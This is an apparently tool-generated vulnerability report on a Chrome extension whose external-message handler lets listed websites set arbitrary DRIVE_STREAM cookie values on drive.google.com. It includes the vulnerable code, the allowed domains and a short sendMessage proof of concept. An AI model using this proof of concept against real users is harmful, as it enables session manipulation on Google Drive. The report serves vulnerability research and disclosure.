# CoCo Analysis: foahoboefnlidmejppiibgnifpbjeknh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/tmp/EOPG/result_analyze/opgen_results/server/all/detected/foahoboefnlidmejppiibgnifpbjeknh/opgen_generated_files/bg.js
Line 864    cookie.value = request.cookie;
```

**Code:**

```javascript
// Background script - Entry point via external messaging
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
    // ← External websites in externally_connectable can send messages
    switch (request.type) {
        case "dv":
            var cookie = {};
            cookie.url = "https://drive.google.com";
            cookie.name = "DRIVE_STREAM";
            cookie.value = request.cookie;  // ← SINK: attacker-controlled cookie value
            cookie.domain = "drive.google.com";
            cookie.sameSite = "no_restriction";
            cookie.secure = true;
            chrome.cookies.set(cookie);  // ← Sets cookie on drive.google.com with attacker data
            sendResponse({
                msg: "dv"
            });
            break;
    }
});
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Any of the websites listed in the `externally_connectable` manifest field:
- `*://localhost/*`
- `*://*.kotakhitam.casa/*`
- `*://*.kotakputih.casa/*`
- `*://dutaxx1.com/*`
- `*://*.dutaxx1.com/*`
- `*://indxxi.link/*`
- `*://*.indxxi.link/*`
- `*://indxxi.xyz/*`
- `*://*.indxxi.xyz/*`
- `*://gdriveplayer.net/*`
- `*://*.gdriveplayer.net/*`
- `*://driveplayer.net/*`
- `*://*.driveplayer.net/*`
- Multiple IP addresses (193.164.131.42, 204.48.22.58, etc.)

**Attack Vector:** chrome.runtime.sendMessage from externally connectable websites

**Attack:**

```javascript
// Malicious code on any of the externally_connectable websites
// (e.g., attacker compromises or controls one of these domains)

// Extension ID for FixPlay G Server
var extensionId = "foahoboefnlidmejppiibgnifpbjeknh";

// Send malicious cookie value
chrome.runtime.sendMessage(extensionId, {
    type: "dv",
    cookie: "malicious_session_token_here"  // Attacker-controlled cookie value
}, function(response) {
    console.log("Cookie set successfully:", response);
});

// Example: Session hijacking
// Attacker can set arbitrary cookies for drive.google.com including:
// - Authentication tokens
// - Session identifiers
// - Tracking cookies
// - Any other DRIVE_STREAM cookie values
```

**Impact:** Cookie manipulation on drive.google.com domain. An attacker controlling any of the externally connectable websites (or compromising one of them) can set arbitrary cookie values for the DRIVE_STREAM cookie on drive.google.com. This can be used to:
- Inject malicious session tokens
- Manipulate user sessions on Google Drive
- Potentially bypass certain security controls that rely on cookie values
- Track users across sessions
- Interfere with the normal operation of Google Drive

While the cookie name is fixed to "DRIVE_STREAM", the attacker has full control over the cookie value, which can be exploited depending on how this cookie is used by Google Drive or the associated streaming services.
